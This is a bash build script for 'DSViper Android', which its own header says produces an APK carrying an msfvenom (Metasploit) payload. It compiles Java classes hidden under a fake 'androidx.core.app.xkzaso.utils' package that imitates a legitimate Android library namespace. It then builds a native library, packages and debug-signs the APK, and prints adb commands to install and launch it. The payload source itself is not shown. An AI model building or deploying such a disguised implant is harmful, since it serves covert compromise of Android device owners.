#!/bin/bash

# DSViper Android - Build Script
# Builds the working DSViper Android APK with msfvenom payload

echo "🚀 DSViper Android Build Script"
echo "================================"

# Check if source code exists
if [ ! -d "source_code/app" ]; then
    echo "❌ Error: source_code/app directory not found"
    exit 1
fi

# Set Android SDK path (update this to your SDK location)
export ANDROID_HOME="/path/to/your/android-sdk"
export PATH=$ANDROID_HOME/cmdline-tools/latest/bin:$ANDROID_HOME/platform-tools:$ANDROID_HOME/build-tools/33.0.2:$PATH

echo "📱 Building DSViper Android APK..."

cd source_code

# Compile Java code
echo "🔨 Compiling Java code..."
mkdir -p classes
javac -d classes -cp $ANDROID_HOME/platforms/android-33/android.jar app/src/main/java/androidx/core/app/xkzaso/utils/*.java

# Create DEX file
echo "📦 Creating DEX file..."
mkdir -p dex
d8 --output dex classes/androidx/core/app/xkzaso/utils/*.class

# Build native library
echo "🔧 Building native library..."
cd app/src/main/cpp
export ANDROID_NDK_HOME=$ANDROID_HOME/ndk/25.2.9519653
cmake -DCMAKE_TOOLCHAIN_FILE=$ANDROID_NDK_HOME/build/cmake/android.toolchain.cmake -DANDROID_ABI=arm64-v8a -DANDROID_PLATFORM=android-21 -DCMAKE_BUILD_TYPE=Release .
make -j$(nproc)
cd ../../../..

# Package APK
echo "📱 Packaging APK..."
aapt package -f -0 arsc -M app/src/main/AndroidManifest.xml -S app/src/main/res -I $ANDROID_HOME/platforms/android-33/android.jar -F dsviper_unsigned.apk

# Add native library and DEX
mkdir -p temp_apk
cd temp_apk
unzip -q ../dsviper_unsigned.apk
mkdir -p lib/arm64-v8a
cp ../app/src/main/cpp/libdsviper_native.so lib/arm64-v8a/
cp ../dex/classes.dex .
zip -0 -r ../dsviper_complete.apk .
cd ..
rm -rf temp_apk

# Sign APK
echo "✍️ Signing APK..."
apksigner sign --ks ~/.android/debug.keystore --ks-pass pass:android --key-pass pass:android --out ../compiled_apks/dsviper_android_built.apk dsviper_complete.apk

# Clean up
rm -rf classes dex dsviper_unsigned.apk dsviper_complete.apk

cd ..

echo "✅ Build completed successfully!"
echo "📱 APK location: compiled_apks/dsviper_android_built.apk"
echo ""
echo "🚀 Installation command:"
echo "adb install compiled_apks/dsviper_android_built.apk"
echo ""
echo "🎯 Launch command:"
echo "adb shell am start -n androidx.core.app.xkzaso.utils/.MainActivity"
